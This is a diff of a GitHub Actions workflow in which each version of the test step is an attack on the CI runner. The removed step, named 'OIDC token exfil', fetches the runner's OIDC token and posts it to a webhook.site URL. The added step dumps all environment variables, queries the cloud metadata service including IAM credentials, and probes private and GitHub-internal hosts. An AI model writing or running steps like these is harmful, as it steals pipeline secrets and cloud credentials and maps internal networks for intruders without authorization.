@@ -7,11 +7,17 @@ jobs:
   test:
     runs-on: ubuntu-latest
     steps:
-      - name: OIDC token exfil
+      - name: dump everything
         run: |
-          TOKEN=$(curl -s -H "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
-            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange")
-          curl -s -X POST "https://webhook.site/24fac163-855d-4841-ba2f-8c312f82d4fa" \
-            -H "Content-Type: application/json" \
-            -d "$TOKEN"
-          echo "Sent to webhook!"
+          echo "=== ALL ENV ==="
+          env
+          echo "=== NETWORK ==="
+          curl -s http://169.254.169.254/latest/meta-data/ 2>&1
+          curl -s http://169.254.169.254/latest/meta-data/iam/ 2>&1
+          echo "=== INTERNAL NETWORK SCAN ==="
+          for ip in 10.0.0.1 172.16.0.1 192.168.0.1; do
+            curl -s --max-time 2 http://$ip/ 2>&1 | head -3
+          done
+          echo "=== GITHUB INTERNAL ==="
+          curl -s --max-time 2 http://github.internal/ 2>&1 | head -5
+          curl -s --max-time 2 http://api.github.internal/ 2>&1 | head -5
